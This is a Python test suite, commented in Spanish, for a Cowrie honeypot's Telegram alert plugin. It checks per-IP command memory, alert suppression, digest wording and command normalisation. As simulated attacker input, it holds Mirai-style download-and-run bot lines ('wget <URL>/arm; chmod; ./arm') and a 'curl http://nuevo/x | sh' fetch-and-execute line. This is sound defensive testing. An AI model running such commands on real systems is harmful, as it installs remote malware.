#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
test_memoria_cowrie.py --- lo que el plugin recuerda y lo que cuenta: la
memoria por IP, que decide cuando callar, y el resumen, que dice que se ha
callado. Los dos fallaban de la misma manera: afirmando cosas que no eran.

    python3 "TELEGRAM SCRIPTS/tests/test_memoria_cowrie.py"

Existe por un aviso que llego asi, literalmente:

    Vez 341 con este guion (solo se avisan las 2 primeras)
    Ya estaba silenciada, pero trae comandos NUEVOS:

Las dos lineas juntas no pueden ser verdad, y no lo eran. De cada IP se
guardaban como mucho MAX_CMDS_PER_IP hashes de comandos, y al pasarse se
recortaba con `set(list(...)[-N:])`: un set no tiene orden de insercion, asi
que el recorte tiraba al azar ---y podia tirar justo lo que se acababa de
aprender---. Un bot con un guion mas largo que el tope no cabia nunca entero
en su propia memoria, asi que en CADA sesion habia comandos "que no le
habiamos visto nunca" y la alerta sonaba siempre. La clase ya documentaba la
regla correcta para `samples` y `creds` ---dict, y se tiran los mas
antiguos--- pero no se habia aplicado aqui.

Lo que se comprueba:

  - que 341 sesiones IDENTICAS avisan UNA vez, con guiones cortos y largos;
  - que un comando de verdad nuevo sigue sonando, que es para lo que existe;
  - que al recortar se van los MAS ANTIGUOS, no unos al azar;
  - que si de una IP se ha olvidado algo, deja de afirmarse que algo es nuevo:
    sobre una memoria incompleta no se puede distinguir "nunca lo hizo" de "se
    me olvido";
  - que guardar y volver a cargar NO reordena la memoria, que es donde se
    perdia el orden en silencio (`sorted()` en cada guardado);
  - y que ningun texto que se envia promete "solo las 2 primeras" en un aviso
    que es la vez 341.

Y del resumen ---el "[Cowrie] Resumen" de cada media hora---:

  - que la ventana que dice sea la de verdad. Cuando en un intervalo no hay
    nada que callar no se manda resumen, pero los contadores seguian
    corriendo: las sesiones de ese rato aparecian sumadas al resumen siguiente
    como si fueran de su media hora. 40 sesiones de hace una hora se leian
    dentro de "los ultimos 30 minutos";
  - que separe AVISOS de EVENTOS. Decia "Eventos silenciados: 300" cuando lo
    que se habia callado era UN aviso de una sesion con 300 comandos;
  - y que los totales de memoria se vean como lo que son ---acumulados, y con
    tope--- y no como actividad del intervalo.

Las funciones se EXTRAEN del fichero que se despliega, no se copian aqui: una
copia se queda vieja sin avisar. El plugin entero no se puede importar, porque
depende de Twisted y de los modulos de Cowrie.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import sys
import tempfile
import time
from pathlib import Path

FUENTE = (Path(__file__).resolve().parent.parent / "COWRIE"
          / "telegram_alert_cowrie.py")
SRC = FUENTE.read_text(encoding="utf-8")

OK = 0
MAL = 0


def comprueba(que, esperado, obtenido):
    global OK, MAL
    if esperado == obtenido:
        OK += 1
        print("  ok    %s" % que)
    else:
        MAL += 1
        print("  FALLO %s\n          esperaba %r\n          obtuvo   %r"
              % (que, esperado, obtenido))


def constante(nombre: str) -> int:
    return int(re.search(r"^%s = (\d+)" % nombre, SRC, re.M).group(1))


def metodo(nombre: str) -> str:
    # El corte tiene que parar tambien en "^class ": _expire es el ultimo
    # metodo de Memory y sin eso se arrastraba la clase siguiente entera.
    m = re.search(r"^    def %s\(.*?(?=^    def |^class |\Z)" % re.escape(nombre),
                  SRC, re.S | re.M)
    if not m:
        sys.exit("no se encontro el metodo %s en %s" % (nombre, FUENTE))
    return m.group(0)


MAX_CMDS_PER_IP = constante("MAX_CMDS_PER_IP")
MAX_IPS_TRACKED = constante("MAX_IPS_TRACKED")


def cmd_hash(command: str) -> str:
    return hashlib.sha1(command.encode("utf-8", "replace")).hexdigest()[:8]


class _Log:
    @staticmethod
    def msg(*_a, **_k):
        pass


cuerpo = "class Memoria:\n" + "".join(
    metodo(n) for n in ("load", "save", "ip_entry", "novel_commands",
                        "learn_commands", "_expire"))
ns = {"time": time, "json": json, "os": os, "log": _Log,
      "cmd_hash": cmd_hash, "MAX_CMDS_PER_IP": MAX_CMDS_PER_IP,
      "MAX_IPS_TRACKED": MAX_IPS_TRACKED, "IP_MEMORY_TTL": 0}
exec(compile(cuerpo, str(FUENTE), "exec"), ns)
Memoria = ns["Memoria"]


def nueva(path="") -> object:
    m = Memoria.__new__(Memoria)
    m.ips, m.playbooks = {}, {}
    m.samples, m.creds, m.banned = {}, {}, set()
    m.path, m._dirty = path, False
    return m


def guion(n: int) -> list[str]:
    """Un guion de bot: una linea por arquitectura, mas los busybox sueltos."""
    base = [f"cd /tmp; wget <URL>/{a}; chmod <N> {a}; ./{a}; rm {a}"
            for a in ("arm", "arm5", "arm6", "arm7", "mips", "mipsel", "x86",
                      "x86_64", "sh4", "ppc", "spc", "m68k", "arc", "i686")]
    base += [f"/bin/busybox {c}" for c in
             ("wget", "tftp", "cp", "rm", "chmod", "cat", "echo", "kill", "ps")]
    base += ["enable", "system", "shell", "sh", "config terminal",
             "cat i>ii &&rm i", "chmod <N> i ||(cp /bin/ls ii", "rm ii)"]
    salida = []
    while len(salida) < n:
        salida += [f"{c} #{len(salida)//len(base)}" for c in base]
    return salida[:n]


def veces_que_suena(cmds: list[str], sesiones: int = 341) -> int:
    mem = nueva()
    suena = 0
    for _ in range(sesiones):
        if mem.novel_commands("1.2.3.4", set(cmds)):
            suena += 1
        mem.learn_commands("1.2.3.4", set(cmds))
    return suena


print("\nUn guion repetido suena UNA vez, mida lo que mida")
for largo in (30, 100, 200, MAX_CMDS_PER_IP, MAX_CMDS_PER_IP * 2):
    comprueba("guion de %d comandos: 341 sesiones identicas -> 1 aviso" % largo,
              1, veces_que_suena(guion(largo)))

print("\nPero un comando de verdad nuevo sigue sonando")
mem = nueva()
cmds = guion(30)
mem.learn_commands("1.2.3.4", set(cmds))
comprueba("repetir lo mismo no trae nada nuevo",
          set(), mem.novel_commands("1.2.3.4", set(cmds)))
comprueba("y una linea que nunca escribio si sale",
          {"curl http://nuevo/x | sh"},
          mem.novel_commands("1.2.3.4", set(cmds) | {"curl http://nuevo/x | sh"}))

print("\nAl recortar se van los MAS ANTIGUOS, no unos al azar")
mem = nueva()
for i in range(MAX_CMDS_PER_IP + 50):
    mem.learn_commands("5.6.7.8", {"comando numero %d" % i})
recordados = mem.ip_entry("5.6.7.8")["cmds"]
comprueba("se guarda exactamente el tope", MAX_CMDS_PER_IP, len(recordados))
comprueba("el primero que entro ya no esta",
          False, cmd_hash("comando numero 0") in recordados)
comprueba("y el ultimo si",
          True, cmd_hash("comando numero %d" % (MAX_CMDS_PER_IP + 49)) in recordados)

print("\nSobre una memoria incompleta no se afirma que algo sea nuevo")
comprueba("la IP queda marcada cuando se le olvida algo",
          True, mem.ip_entry("5.6.7.8")["trunc"])
comprueba("y deja de decir que nada es nuevo, en vez de decirlo de todo",
          set(), mem.novel_commands("5.6.7.8", {"algo que jamas escribio"}))
comprueba("una IP que cabe entera no se marca",
          False, nueva().ip_entry("9.9.9.9")["trunc"])

print("\nGuardar y volver a cargar no reordena la memoria")
tmp = Path(tempfile.mkdtemp()) / "estado.json"
m1 = nueva(str(tmp))
orden = ["zzz primero", "aaa segundo", "mmm tercero"]
for c in orden:
    m1.learn_commands("4.4.4.4", {c})
m1._dirty = True
m1.save()
m2 = nueva(str(tmp))
m2.load()
comprueba("el orden de insercion sobrevive al guardado",
          [cmd_hash(c) for c in orden], list(m2.ip_entry("4.4.4.4")["cmds"]))
comprueba("y la marca de memoria incompleta tambien",
          True, "trunc" in m2.ip_entry("4.4.4.4"))
m1.ips["4.4.4.4"]["trunc"] = True
m1._dirty = True
m1.save()
m3 = nueva(str(tmp))
m3.load()
comprueba("una IP marcada sigue marcada al recargar",
          True, m3.ip_entry("4.4.4.4")["trunc"])

print("\nNada usa un nombre que no existe al importarse")
# ESTA COMPROBACION EXISTE POR UN FALLO QUE DEJO AL SENUELO SIN AVISAR.
#
# Se colo un `sys.path.insert(...)` en el plugin con `sys` SIN IMPORTAR. La
# sintaxis es correcta, asi que ast.parse pasaba; y las suites sacan funciones
# sueltas del fichero y las ejecutan en su propio espacio de nombres, asi que
# NINGUNA llegaba a importar el modulo entero. El NameError solo aparecia
# cuando Cowrie cargaba el plugin al arrancar: el plugin no se cargaba, y el
# senuelo se quedaba sin Telegram por completo. Un adorno que falla no puede
# llevarse el canal por delante.
#
# Aqui no se puede importar de verdad ---hace falta Twisted, treq y Cowrie---
# asi que se comprueba lo que si se puede: que todo nombre usado FUERA de una
# funcion o una clase este definido antes.
import ast as _ast
import builtins as _builtins


def sin_definir(ruta):
    arbol = _ast.parse(open(ruta, encoding="utf-8").read())
    hay = set(dir(_builtins)) | {"__file__", "__name__", "annotations"}
    for n in arbol.body:
        for sub in _ast.walk(n):
            if isinstance(sub, _ast.Import):
                for a in sub.names:
                    hay.add((a.asname or a.name).split(".")[0])
            elif isinstance(sub, _ast.ImportFrom):
                for a in sub.names:
                    hay.add(a.asname or a.name)
        if isinstance(n, (_ast.FunctionDef, _ast.AsyncFunctionDef, _ast.ClassDef)):
            hay.add(n.name)
            continue
        for sub in _ast.walk(n):
            if isinstance(sub, _ast.Name) and isinstance(sub.ctx, _ast.Store):
                hay.add(sub.id)
    return sorted({(x.lineno, x.id) for n in arbol.body
                   if not isinstance(n, (_ast.FunctionDef, _ast.AsyncFunctionDef,
                                         _ast.ClassDef))
                   for x in _ast.walk(n)
                   if isinstance(x, _ast.Name) and isinstance(x.ctx, _ast.Load)
                   and x.id not in hay})


for _f in sorted((FUENTE.parent.parent).glob("geoip/*.py")) + [FUENTE]:
    comprueba("%s se puede importar sin NameError" % _f.name, [], sin_definir(_f))

# EL IMPORT DE LA TABLA DE PAISES ES PEREZOSO, y hace falta que lo siga
# siendo. En una instalacion desde cero el contenedor se crea en el apartado
# 3.4.2.9 y la carpeta geoip no se llena hasta el 3.4.4: importando al cargar
# el modulo, el plugin arrancaria con la carpeta vacia y se quedaria sin tabla
# PARA SIEMPRE ---un import solo ocurre una vez--- con las alertas saliendo sin
# bandera y sin que nada lo dijera.
comprueba("el import de paises va dentro de una funcion, no al cargar el modulo",
          True, "def _cargar_paises" in SRC)
comprueba("y no queda ningun import de paises a nivel de modulo", 0,
          sum(1 for l in SRC.splitlines() if l.startswith("import paises")))
comprueba("solo se intenta una vez, no en cada aviso", True,
          "_paises_intentado" in SRC)
comprueba("y el sys.path tampoco se toca al cargar", 0,
          sum(1 for l in SRC.splitlines() if l.startswith("sys.path.insert")))

print("\nUn subshell es UN comando, no cuatro trozos sueltos")
# El troceado partia por ";" a secas, asi que el guion mas repetido de Mirai
# salia descuartizado en el aviso y el ultimo pedazo se quedaba el parentesis
# de cierre: "rm ii)". Leido en el movil parece un error de sintaxis del
# atacante o un mensaje cortado, y no es ni una cosa ni la otra.
ns_t = {"re": re}
exec(compile(re.search(r"_NORM_RULES = \((?:.|\n)*?\n\)\n", SRC).group(0), "r", "exec"), ns_t)
exec(compile(re.search(r"def _trocear(?:.|\n)*?\n    return partes\n", SRC).group(0),
             "t", "exec"), ns_t)
exec(compile(re.search(r"def normalize_command(?:.|\n)*?\n    return out\n", SRC).group(0),
             "n", "exec"), ns_t)
normaliza = ns_t["normalize_command"]

comprueba("el subshell entero se queda de una pieza",
          ["chmod <N> i ||(cp /bin/ls ii;cat i>ii &&rm i;cp ii i;rm ii)", "./i"],
          normaliza("chmod 777 i ||(cp /bin/ls ii;cat i>ii &&rm i;cp ii i;rm ii);./i"))
comprueba("y ya no aparece el 'rm ii)' huerfano", False,
          any(x == "rm ii)" for x in
              normaliza("chmod 777 i ||(cp /bin/ls ii;cat i>ii &&rm i;cp ii i;rm ii);./i")))
comprueba("un ; dentro de comillas no parte el comando",
          ['echo "a;b"', "echo c"], normaliza('echo "a;b"; echo c'))
comprueba("pero los ; de verdad siguen partiendo",
          [">/tmp/.x&&cd /tmp", ">/var/.x&&cd /var"],
          normaliza(">/tmp/.x&&cd /tmp;>/var/.x&&cd /var"))
comprueba("un parentesis sin cerrar no se come el resto de la linea",
          ["(echo a;echo b", "echo c"], normaliza("(echo a;echo b\necho c"))

print("\nNingun texto que se envia se desmiente a si mismo")
# Solo las lineas que construyen mensaje, no los comentarios que explican el
# fallo antiguo.
enviadas = [l for l in SRC.splitlines()
            if "msgtxt +=" in l or ("%" in l and "Vez %d" in l)]
comprueba("ya no se promete 'solo las N primeras' en un aviso de la vez 341",
          [], [l.strip() for l in enviadas if "solo se avisan las" in l])
comprueba("y pasado el cupo se dice por que suena igualmente",
          True, "callada desde la" in SRC)

# --------------------------------------------------------------------------
# El resumen
PLAYBOOK_MAX = constante("PLAYBOOK_MAX")


def _eventos(n: int) -> str:
    return "1 evento" if n == 1 else "%d eventos" % n


cuerpo_res = "class Salida:\n" + "".join(
    metodo(n) for n in ("_reparto_por_via", "_suppress", "_send_digest"))
# pais_de se sustituye por un doble: lo que se prueba aqui es el resumen, no
# la tabla de paises ---esa tiene su propia suite---.
ns_res = {"time": time, "_esc": str, "_eventos": _eventos,
          "pais_de": lambda ip: "  BANDERA" if ip else "",
          "NOMBRE_PROTOCOLO": {"ssh": "SSH", "telnet": "Telnet"},
          "PLAYBOOK_MAX": PLAYBOOK_MAX, "MAX_IPS_TRACKED": MAX_IPS_TRACKED}
exec(compile(cuerpo_res, str(FUENTE), "exec"), ns_res)
Salida = ns_res["Salida"]


class _Mem:
    def __init__(self, guiones, ips):
        self.playbooks = dict.fromkeys(range(guiones))
        self.ips = dict.fromkeys(range(ips))


def salida(guiones=3, ips=7, hace_minutos=30):
    o = Salida.__new__(Salida)
    o._suppressed, o._suppressed_ips, o._sesiones_por_via = {}, {}, {}
    o._dropped = 0
    o._ventana_desde = time.time() - hace_minutos * 60
    o.memory = _Mem(guiones, ips)
    o.enviados = []
    o._enqueue = lambda msg, ip, priority=1: o.enviados.append(msg)
    return o


print("\nEl resumen dice la ventana de verdad, no 'la ultima media hora'")
o = salida(hace_minutos=30)
for _ in range(40):
    o._sesiones_por_via["ssh"] = o._sesiones_por_via.get("ssh", 0) + 1
o._send_digest()
comprueba("un intervalo sin nada que callar no manda resumen", 0, len(o.enviados))
comprueba("y NO tira las sesiones de ese rato",
          40, o._sesiones_por_via.get("ssh"))

o._ventana_desde = time.time() - 62 * 60      # ha pasado otro intervalo
for _ in range(3):
    o._sesiones_por_via["ssh"] = o._sesiones_por_via.get("ssh", 0) + 1
o._suppress("misma IP repitiendo su guion", "1.2.3.4", 12)
o._send_digest()
texto = o.enviados[-1]
comprueba("ahora si lo manda", 1, len(o.enviados))
comprueba("con las 43 sesiones que de verdad hubo",
          True, "SSH: 43" in texto)
comprueba("y diciendo que la ventana son 62 min, no 30",
          True, "ultimos 62 min" in texto)
comprueba("al mandarlo si se reinicia la cuenta de sesiones",
          {}, o._sesiones_por_via)

print("\nUn aviso callado es UNO, tenga los comandos que tenga")
o = salida()
o._suppress("misma IP repitiendo su guion", "1.2.3.4", 300)
o._send_digest()
texto = o.enviados[-1]
comprueba("no se anuncian 300 avisos escondidos",
          True, "Avisos callados: <strong>1</strong>" in texto)
comprueba("pero los 300 eventos se dicen igual, entre parentesis",
          True, "(300 eventos)" in texto)

o = salida()
o._suppress("login repetido de la misma IP", "9.9.9.9")
o._send_digest()
texto = o.enviados[-1]
comprueba("cuando aviso y evento son lo mismo no se repite el numero",
          False, "eventos)" in texto.split("IPs mas")[0])
comprueba("y en singular no se escribe '1 eventos'",
          False, "1 eventos" in texto)
comprueba("sino '1 evento'", True, "1 evento)" in texto)

print("\nLos totales de memoria no se leen como actividad del intervalo")
o = salida(guiones=PLAYBOOK_MAX, ips=MAX_IPS_TRACKED)
o._suppress("x", "1.1.1.1")
o._send_digest()
texto = o.enviados[-1]
comprueba("se dicen acumulados", True, "Memoria acumulada:" in texto)
comprueba("y se avisa de que estan en el tope", 2, texto.count("(tope)"))
o = salida(guiones=3, ips=7)
o._suppress("x", "1.1.1.1")
o._send_digest()
comprueba("si no lo estan, no se dice nada", 0, o.enviados[-1].count("(tope)"))

print("\nLo descartado por cola llena no se pierde al informar de ello")
o = salida()
o._suppress("x", "1.1.1.1")
o._dropped = 4
# El propio resumen puede caerse al encolarlo: es justo cuando hace falta
# saberlo, asi que ese descarte no se puede ir con el reinicio del contador.
o._enqueue = lambda msg, ip, priority=1: (o.enviados.append(msg),
                                          setattr(o, "_dropped", o._dropped + 1))
o._send_digest()
comprueba("informa de los 4 que habia", True, "cola llena: 4" in o.enviados[-1])
comprueba("y conserva el que se descarto al mandarlo", 1, o._dropped)

print("\nLas IP del resumen llevan su pais")
o = salida()
o._suppress("x", "1.1.1.1", 5)
o._send_digest()
comprueba("la bandera va pegada a la IP, antes del recuento",
          True, "</a>  BANDERA (5 eventos)" in o.enviados[-1])

print("\n-------------------------------------")
print("ok: %d   fallos: %d" % (OK, MAL))
sys.exit(1 if MAL else 0)
